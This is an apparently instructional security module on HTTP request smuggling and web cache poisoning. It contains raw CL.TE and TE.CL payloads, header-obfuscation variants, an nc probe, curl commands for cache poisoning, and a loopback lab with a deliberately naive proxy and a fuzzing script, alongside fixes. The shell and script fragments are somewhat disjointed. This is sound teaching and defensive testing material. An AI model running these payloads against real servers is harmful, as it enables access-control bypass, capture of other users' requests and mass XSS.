Request Smuggling and Cache Poisoning

Summary

ps-01 predicted this: HTTP says how to frame a request in two ways — Content-Length and
Transfer-Encoding. When a front-end and a back-end pick different ones, they disagree about
where one request ends. Everything that follows is that disagreement being exploited.

This is also the most advanced topic in the tier, because it requires a layered topology
(CDN → load balancer → application server), and because the payoff is a request that
bypasses the front-end's validation entirely.

This is where ps-01's URL-ambiguity table gets its payoff. Read it
alongside cs161-06 on what a network-layer control can and cannot do.

The core ambiguity

POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked

0

G

  WHAT Content-Length SAYS: the body is 6 bytes -> the next byte starts
                             a new request at "G"

  WHAT Transfer-Encoding SAYS: the body is chunked, terminated by 0
                                -> "G" is the start of the NEXT request

  IF THE FRONT-END TRUSTS Transfer-Encoding and the BACK-END TRUSTS
  Content-Length: the front-end forwards one request. The back-end sees
  TWO. The second one never went through the front-end.

  THAT IS THE ENTIRE ATTACK. Everything else is application.

The two variants

  CL.TE   front-end uses Content-Length, back-end uses Transfer-Encoding
          (classic; most common historically, e.g. nginx -> some servers)

  TE.CL   front-end uses Transfer-Encoding, back-end uses Content-Length
          (modern proxies front, Node/Python back)

CL.TE, the classic

POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

  front-end reads Content-Length: 13 -> the body is "0\r\n\r\nSMUGG"
                                     -> forwards it
  back-end reads chunked          -> "0" ends the body
                                     -> "SMUGG" is request #2

  FIND THE CORRECT LENGTH: it must cover "0\r\n\r\n" (5 bytes) plus the
  start of a real request, and it must be SHORT of the whole thing.
  That arithmetic is the only fiddly part.

TE.CL, the modern one

POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target
...

0

  front-end reads chunked          -> consumes everything, forwards
  back-end reads Content-Length: 4 -> takes "5c\nG" as body #1
                                     -> "POST / HTTP/1.1..." is request #2

  Variant: TE.TE with a malformed header that the front-end ignores:
    Transfer-Encoding: chunked
    Transfer-Encoding: x          <- front-end reads the FIRST, back-end the LAST
  or   Transfer-Encoding : chunked   <- the space breaks one parser
  or   Transfer-Encoding: chunked;q=0  <- a parameter one parser honours

What you can actually do with a smuggled request

  1. BYPASS ACCESS CONTROL
     the smuggled request skips the front-end's authorisation entirely
     if the back-end trusts it because it came "from inside"

  2. BYPASS SECURITY CONTROLS
     WAF, rate limiter, IP allowlist, geo check - all sit in front.
     A smuggled request never meets them.

  3. POISON THE CACHE
     you smuggle a response the front-end cached, so every subsequent
     visitor receives your content  ->  XSS at scale

  4. WEB CACHE DECOISION
     you poison, then request a normal URL, and get the poisoned
     response. Victim + attacker are the same request.

  5. CAPTURE OTHER USERS' REQUESTS
     if the smuggling makes the back-end queue the "extra" request,
     it may sit there until the next user sends a request on that
     connection - and then it gets PREFIXED to theirs.
     THIS IS THE SEVERE CASE. It captures other people's requests.

Detection

# The canonical probe. Two timings, two responses.
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | nc TARGET 80

  CL.TE signs:
    - you get TWO HTTP responses
    - or one response then a hang (the back-end is waiting for more)
    - or the connection closes with the second request unprocessed

  TE.CL signs:
    - you get a 400 from the front-end that mentions "chunked"
    - or the back-end waits for a body that never comes
    - often identifiable by timing alone

  THE OTHER SIGN:
    HTTP/1.1 to a backend that only speaks HTTP/1.0 -> everything queued.

Hiding the payload

  Transfer-Encoding values a front-end may not recognise as chunked:
    Transfer-Encoding: chunked      <- standard
    Transfer-Encoding : chunked     <- space before the colon
    Transfer-Encoding: chunked, x   <- trailing junk
    Transfer-Encoding: xchunked     <- prefix
    Transfer-Encoding: chunked\x00  <- NUL
    Transfer-Encoding:\tchunked     <- tab
    X: Transfer-Encoding: chunked   <- folded into another header

  If the front-end does not see "chunked" it falls back to
  Content-Length. That is exactly what you need it to do.

Cache poisoning

  A shared cache keys responses by URL (and sometimes by Host, Vary).

  TWO POISONS:
    UNKEYED      you change something the cache does NOT key on
                 (a header, a POST parameter, a cookie, a path
                  normalisation) -> your response is served to everyone
    KEYED but    you get your own cache key to be served to others
    unkeyed       (Host header poisoning, X-Forwarded-Host, web cache
    header         deception for password resets)

  THE MECHANISM, in three steps:
    1. make the BACK-END reflect something attacker-controlled into a
       response header or body, on a URL that gets cached
    2. send the request in a way that gets that response CACHED
    3. request the URL normally and get your payload back

  CACHING PREDICATES TO SATISFY:
    - the method must be a GET or a HEAD
    - the response must have a cacheable status (200, 301, 404)
    - there must be no Cache-Control: no-store / private
    - there must be no Set-Cookie (many caches refuse to store it)
    - the URL must be cacheable per the cache policy

Web cache deception

  Path-based:
    /static/app.js -> cached, public
    /static/../../home/user/profile -> ALSO matches /static/* to the
    cache, but resolves to a private page for the back-end.

    So: request your own profile through the "static" prefix.
    The cache stores it. Now any unauthenticated visitor gets your
    profile page. That's a full account takeover primitive on many apps.

  THE FIX:
    - normalise the path BEFORE the cache key is computed
    - and make the cache key and the routing use the SAME normalisation
    - never serve personalised content from a shared cache path

Fixing it, properly

  THE CORRECT FIX, in order of effectiveness:
  1. REJECT ambiguous framing at the front-end
     - if both Content-Length and Transfer-Encoding are present, reject
     - reject Transfer-Encoding on requests that do not need it
     - normalise whitespace/case in the header NAME, then apply the
       spec: if Transfer-Encoding is present, IGNORE Content-Length
  2. USE A PROXY THAT IMPLEMENTS THE RFC CORRECTLY
     - ALB, Envoy, nginx with http2 disabled on the backend hop
  3. Do not let the back-end and front-end disagree about HTTP versions
  4. For cache: normalise once, before both key and routing
  5. For cache: never cache a response that varies by an unkeyed input

The RFC rule that settles it: if Transfer-Encoding is present,
Content-Length must be ignored (and ideally rejected). Half of the
implementations in the wild do the opposite.

Terminology

Term Meaning
Request smuggling Two requests where the sender sent one
CL.TE Front-end trusts Content-Length, back-end trusts Transfer-Encoding
TE.CL The reverse
TE.TE Both use TE; they disagree on which header is the TE
Chunked encoding size\r\ndata\r\n framing, ended by 0\r\n\r\n
Desync The front-end and back-end out of sync on the connection
Response queue poisoning One user's response served to another
Request capture Smuggled request prefixed to a victim's request
Unkeyed header Input the cache does not include in its key
Web cache poisoning Getting your response cached for everyone
Web cache deception Getting a personalised response cached
Vary header Tells the cache which request headers change the response
BCP 38 / hop-by-hop Headers a proxy must strip

<?php
// BACK-END: trusts Transfer-Encoding, ignores Content-Length.
$raw = file_get_contents('php://input');
if (isset($_SERVER['HTTP_TRANSFER_ENCODING'])) {
    // "chunked": the body ends at the 0-length chunk. Anything after
    // it is a SEPARATE request, which we now process independently.
    $parts = preg_split("/\r\n0\r\n/", $raw, 2);
    $first = $parts[0] ?? '';
    // treat the remainder as a second request and echo it
    echo "BE: request 1 body=" . json_encode($first) . "\n";
    if (isset($parts[1]) && $parts[1] !== '') {
        echo "BE: *** SMUGGLED REQUEST RECEIVED ***\n";
        echo "BE: " . str_replace("\r\n", " | ", $parts[1]) . "\n";
    }
} else {
    echo "BE: normal request, body=" . json_encode(substr($raw,0,80)) . "\n";
}
echo "BE: uri=" . ($_SERVER['REQUEST_URI'] ?? '?') . "\n";
PHP

# the FRONT-END: naive about Content-Length, naive about header spacing
cat > frontend.py <<'PY'
#!/usr/bin/env python3
"""A deliberately naive front-end proxy, for the lab only.

It forwards the raw bytes and trusts Content-Length. That is the bug.
"""
import socket, threading, sys

def handle(c):
    data = b""
    c.settimeout(3)
    try:
        while b"\r\n\r\n" not in data:
            chunk = c.recv(4096)
            if not chunk: break
            data += chunk
        head, _, rest = data.partition(b"\r\n\r\n")
        lines = head.split(b"\r\n")
        clen = 0
        for l in lines[1:]:
            if l.lower().startswith(b"content-length:"):
                clen = int(l.split(b":",1)[1].strip())
        while len(rest) < clen:            # reads Content-Length bytes
            chunk = c.recv(4096)
            if not chunk: break
            rest += chunk
        fwd = head + b"\r\n\r\n" + rest
        u = socket.create_connection(("127.0.0.1", 8081), timeout=3)
        u.sendall(fwd)
        u.shutdown(socket.SHUT_WR)
        out = b""
        u.settimeout(3)
        try:
            while True:
                ch = u.recv(4096)
                if not ch: break
                out += ch
        except socket.timeout:
            pass
        u.close()
        c.sendall(out)
    except Exception:
        pass
    c.close()

s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 8080)); s.listen(5)
print("naive front-end on 127.0.0.1:8080 -> backend on 127.0.0.1:8081")
while True:
    c, _ = s.accept()
    threading.Thread(target=handle, args=(c,), daemon=True).start()
PY

print("  === finding Content-Length for a CL.TE smuggled request ===")
print()
smuggled = ("GET /admin HTTP/1.1\r\n"
            "Host: target\r\n"
            "X-Ignore: x\r\n\r\n")
# the front-end must read exactly the chunked terminator and nothing more.
# terminator is "0\r\n\r\n"; anything after it belongs to request 2.
term = b"0\r\n\r\n"
for extra in range(0, 12):
    cl = len(term) + extra
    consumed = cl
    left_over = len(term) + len(smuggled) - consumed
    print(f"  Content-Length: {cl:>3}   front-end consumes {consumed:>3} bytes   "
          f"back-end sees {left_over:>3} bytes of request 2")
    if left_over > len(term) + 10:
        print("     ^ this one carries a usable fraction of the second request")
        break
print()

# --- 4. cache poisoning, locally ---
cat > 03-cache.md <<'EOF'
# Cache poisoning, demonstrated

The lab: a shared cache that keys on the path only, and an origin that
reflects a request header into the response body.

```text
  CACHE KEY: the URL path. Nothing else.
  So anything that changes the response but not the path is UNKEYED.
```

```bash
# 1. find something the origin reflects
curl -s -H 'X-Forwarded-Host: canary.example' http://target/path | grep canary

# 2. poison: same path, extra header, response is cacheable
curl -s -H 'X-Forwarded-Host: poisoned.example' http://target/path | head

# 3. get it back, WITHOUT the header, from a different "user"
curl -s http://target/path | grep poisoned
#   ^ if this prints, everyone now gets your payload
```

## Cacheability checklist before you try
- [ ] the method is GET or HEAD
- [ ] the status is 200 / 301 / 404
- [ ] no `Cache-Control: no-store` and no `private`
- [ ] no `Set-Cookie` (most caches refuse to store a response with one)
- [ ] `Vary` does not name the header you are using
- [ ] the cache is shared (a local cache in front of one browser is useless)

## Web cache deception (path-based, and worse)
```
  /static/app.js                -> public, cached forever
  /static/../../home/me         -> resolves to a PRIVATE page for the origin

  The cache sees a /static/ request. The origin sees a profile page.
  So: request /static/../../home/me with YOUR cookies, and your profile
  gets cached. Any unauthenticated visitor now receives it.

  This is account takeover on any application with a "static assets"
  directory and no path normalisation at the cache.
```

## What to report
```
  Finding : Web cache poisoning via unkeyed X-Forwarded-Host header
  Path    : GET /product?id=1 (any cacheable GET)
  Proof   : (1) send the header, get the reflection
            (2) send it again with a cache-busting query the cache ignores
            (3) request the URL plainly from a clean session, get the payload
  Impact  : stored XSS served to every visitor; session theft at scale;
            full site compromise
  Fix     : include every input that changes the response in the cache key,
            or do not let the origin reflect untrusted headers at all
```
EOF

python3 - <<'PY'
import socket
def probe(extra_headers):
    s = socket.socket(); s.settimeout(3)
    s.connect(("127.0.0.1", 8080))
    req = ("POST /backend.php HTTP/1.1\r\nHost: 127.0.0.1:8080\r\n"
           "Content-Length: 6\r\n" + extra_headers +
           "Connection: close\r\n\r\n0\r\n\r\nG")
    s.sendall(req.encode())
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            out += c
    except socket.timeout:
        pass
    s.close()
    return out.decode(errors="replace")

variants = [
    ("canonical",        "Transfer-Encoding: chunked\r\n"),
    ("space before :",   "Transfer-Encoding : chunked\r\n"),
    ("trailing junk",    "Transfer-Encoding: chunked, x\r\n"),
    ("prefix",           "Transfer-Encoding: xchunked\r\n"),
    ("uppercase",        "TRANSFER-ENCODING: chunked\r\n"),
    ("tab",              "Transfer-Encoding:\tchunked\r\n"),
    ("duplicate",        "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n"),
]
print("  variant                result")
print("  " + "-"*46)
for name, hdr in variants:
    r = probe(hdr)
    sm = "SMUGGLED" in r
    err = "400" in r.split("\r\n")[0]
    verdict = "SMUGGLED" if sm else ("rejected" if err else "no effect")
    print(f"  {name:<22} {verdict}")
print()
print("  A production front-end should reject or normalise EVERY one of")
print("  these. One that silently accepts any of them is your finding.")

Step 1 is the deliverable: a deliberately naive two-layer proxy stack, on loopback, where
the front-end trusts Content-Length and the back-end trusts Transfer-Encoding. You get to
watch a request split in two, which is a thing that is genuinely hard to picture from a
description.

Step 5 runs seven header-obfuscation variants against your own front-end and reports which
ones were smuggled. That table is the test you'd run against a real target, and the production
answer is "all of them rejected".
